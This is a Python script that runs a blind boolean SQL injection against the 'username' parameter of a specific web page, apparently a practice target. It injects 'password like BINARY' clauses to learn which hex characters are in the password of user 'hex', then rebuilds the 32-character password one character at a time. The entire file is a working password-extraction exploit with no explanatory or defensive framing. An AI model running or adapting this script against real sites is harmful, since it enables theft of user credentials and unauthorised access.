import requests


alphanumericChars='1234567890abcdef'
passwordChars=''
targetURL='http://0xhex.org/sqli/'
passString = 'This user exists.<br>'
password=''

def findPassChars(): 
    global passwordChars, targetURL, passString 
    for c in alphanumericChars:
        r = requests.get(targetURL+'/index.php?username=hex"+and+password+like+BINARY+"%'+c+'%' )
        if passString in r.text:
           passwordChars+= c 
           print ('Password contains character :' + c)
           
           
           
def findPassword(): 
    global  passwordChars, targetURL, password 
    for i in range(32): 
        for c in passwordChars: 
             r =requests.get(targetURL+'/index.php?username=hex"+and+password+like+BINARY+"'+ password + c+'%' )
             if passString in r.text: 
                 password += c                
                 print ('Current password evaluation:' + password) 

           
print("\n \n \n let's find the Password character\n \n \n ")
findPassChars()
print("\n character password contents : " + passwordChars)
print("\n \n \n Now let's find the Password \n \n \n ")
findPassword()
print("\n \n \n  Password is : " + password)
           



